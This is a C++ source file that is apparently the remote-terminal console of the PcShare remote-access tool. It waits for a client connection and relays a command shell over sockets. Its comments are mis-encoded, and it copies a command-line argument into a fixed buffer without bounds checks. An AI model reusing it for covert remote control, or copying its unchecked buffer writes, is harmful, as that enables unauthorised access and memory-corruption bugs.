// PcTlnt.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "PcTlnt.h"
#include "stdafx.h"
#include <windows.h>
#include <winsock.h>
#include <process.h>
#include "SocketRx.h"
#include "SocketDx.h"
#include "SocketTx.h"
#include <conio.h>
#include <signal.h>
#include "MySocketDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// Ψһ��Ӧ�ó������
CWinApp theApp;
using namespace std;
HANDLE stdin1;
HANDLE stdout1;
HANDLE stderr1;

HANDLE hThread[2];
HANDLE hEvent;

void sig_int(int signo)
{
	TerminateThread(hThread[0],0);
	TerminateThread(hThread[1],0);
	exit(0);
}

BOOL WaitForTrans(HANDLE m_WaitEvent)
{
	MSG  msg; 
	while (1) 
	{ 
		if(WaitForSingleObject(m_WaitEvent, 1) 
			!= WAIT_TIMEOUT)
			break;
	
		while(PeekMessage(&msg, NULL,  0, 0, PM_REMOVE)) 
		{ 
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		} 
	} 
	return TRUE;
}

int _tmain(int argc, char* argv[], char* envp[])
{
	int nRet;

	nRet = AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0);
	if ( nRet == FALSE )
	{
		printf("\nAfxWinInit Fail..............!\n");
		return 0;
	}

	//����
	char m_Title[256] = {0};
	strcpy(m_Title, argv[1]);
	char* pFind = strrchr(m_Title,':');
	if(pFind != NULL)
	{
		*(pFind + 9) = 0;
	}

	//��ʼ��SOCKET����
	WSADATA		data;
	if(WSAStartup(MAKEWORD(2, 2), &data))
		return FALSE;

	if (LOBYTE(data.wVersion) !=2 || 
		HIBYTE(data.wVersion) != 2)
	{
		WSACleanup();
		return FALSE;
	}

	//�ȴ��׽�������
	SetConsoleTitle("PcShare�����ն�-�ȴ��ͻ�������");
	hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	CMySocketDlg dlg(m_Title, hEvent);
	if(!dlg.Create(dlg.IDD, NULL))
		return -1;

	WaitForTrans(hEvent);
	CloseHandle(hEvent);
	dlg.DestroyWindow();

	//�����ж��ź�
	signal(SIGINT,sig_int);
	signal(SIGTERM,sig_int);
	signal(SIGABRT,sig_int);

	BringWindowToTop(AfxGetMainWnd()->GetSafeHwnd());
	stdin1 = GetStdHandle(STD_INPUT_HANDLE);
	stdout1 = GetStdHandle(STD_OUTPUT_HANDLE);
	stderr1 = GetStdHandle(STD_ERROR_HANDLE);
	SetConsoleMode(stdin1,ENABLE_LINE_INPUT|ENABLE_ECHO_INPUT|ENABLE_PROCESSED_INPUT);
	CSocketRx SocketRx(dlg.m_soRecv,hThread[0]); 
	CSocketTx SocketTx(dlg.m_soSend,hThread[1]);
	SetConsoleTitle(m_Title);
	WaitForMultipleObjects(2,hThread,FALSE,INFINITE);
	return 0;
}
